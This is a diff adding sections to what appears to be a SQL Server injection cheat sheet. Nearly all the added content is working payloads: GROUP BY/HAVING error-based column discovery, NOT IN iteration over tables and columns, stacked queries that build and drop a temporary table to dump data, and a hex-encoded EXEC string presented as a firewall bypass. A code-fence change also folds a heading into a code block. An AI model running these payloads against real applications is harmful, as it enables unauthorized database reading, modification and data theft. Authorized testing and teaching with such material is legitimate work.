@@ -41,6 +41,24 @@ ORDER BY n-- (Error when n is greater than the number of columns)
 HAVING 1=1--           -- Error message can indicate column count
 ```
 
+#### Using GROUP BY/HAVING Method
+
+This technique incrementally discovers column names through error messages:
+
+```sql
+1' HAVING 1=1--
+-- Error reveals first column name
+
+1' GROUP BY username HAVING 1=1--
+-- Error reveals second column name
+
+1' GROUP BY username, password HAVING 1=1--
+-- Error reveals third column name (if exists)
+
+1' GROUP BY username, password, permission HAVING 1=1--
+-- Continue until no more errors
+```
+
 ### Information Schema Views
 
 SQL Server provides standardized INFORMATION_SCHEMA views for metadata discovery:
@@ -104,8 +122,11 @@ ORDER BY o.name, c.column_id
 ### Legacy System Tables (SQL Server 2000 and earlier)
 
 ```sql
--- List tables
+-- List user tables
 SELECT name FROM sysobjects WHERE xtype = 'U'
+
+-- List views
+SELECT name FROM sysobjects WHERE xtype = 'V'
 
 -- List columns for a table
 SELECT c.name FROM syscolumns c
@@ -117,17 +138,30 @@ WHERE o.name = 'users'
 
 When you can only return a single value, use concatenation:
 
-```sql
+````sql
 -- Concatenate table names (SQL Server 2017+)
 SELECT STRING_AGG(name, ',') FROM sys.tables
 
--- Older SQL Server versions using XML PATH
 SELECT STUFF((
     SELECT ',' + name
     FROM sys.tables
     FOR XML PATH('')
 ), 1, 1, '')
-```
+
+### Legacy Bulk Extraction (Temporary Tables)
+
+For older versions or when XML functions are unavailable, you can use a temporary table to iterate through data:
+
+```sql
+-- 1. Create temp table and insert data
+AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
+
+-- 2. Dump content
+AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+
+-- 3. Cleanup
+AND 1=0; DROP TABLE TMP_DB;
+````
 
 ### Practical Injection Examples
 
@@ -141,11 +175,10 @@ SELECT STUFF((
 ' UNION SELECT NULL, table_schema + '.' + table_name, NULL FROM information_schema.tables--
 ```
 
-#### UNION Attack for Columns
-
 ```sql
 -- Get columns for a specific table
 ' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
+
 
 -- Get table and column names
 ' UNION SELECT NULL, table_name + '.' + column_name, NULL FROM information_schema.columns--
@@ -156,6 +189,23 @@ SELECT STUFF((
 ```sql
 -- Using error-based extraction for table names
 ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
+
+-- Iterate through tables using NOT IN
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))--
+
+-- Same pattern for columns
+' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns)--
+' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))--
+```
+
+#### Hex Encoding for WAF Bypass
+
+Execute commands using hex-encoded strings:
+
+```sql
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c454354202a2046524f4d207573657273 AS VARCHAR(4000)); EXEC (@S);--
+-- 0x53454c454354202a2046524f4d207573657273 = 'SELECT * FROM users'
 ```
 
 #### Blind Extraction
